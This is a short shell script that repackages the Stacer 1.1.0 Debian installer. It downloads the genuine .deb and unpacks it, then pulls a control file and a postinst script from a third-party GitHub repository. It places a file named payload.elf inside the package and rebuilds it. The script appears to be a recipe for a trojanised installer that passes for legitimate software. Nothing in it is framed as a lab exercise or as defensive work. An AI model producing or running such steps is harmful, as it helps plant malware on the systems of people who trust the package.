wget https://github.com/oguzhaninan/Stacer/releases/download/v1.1.0/stacer_1.1.0_amd64.deb
dpkg -x stacer_1.1.0_amd64.deb stacer_1.1.0_amd64/
cd stacer_1.1.0_amd64/
mkdir DEBIAN
wget https://github.com/3r0-r/test/archive/main.zip
unzip main.zip
cd test-main
chmod 755 postinst
mv control postinst ~/Desktop/test/stacer_1.1.0_amd64/DEBIAN
cd ..
rm main.zip
cd ..
mv payload.elf ~/Desktop/test/stacer_1.1.0_amd64/usr/
dpkg-deb --build stacer_1.1.0_amd64
rm -r stacer_1.1.0_amd64

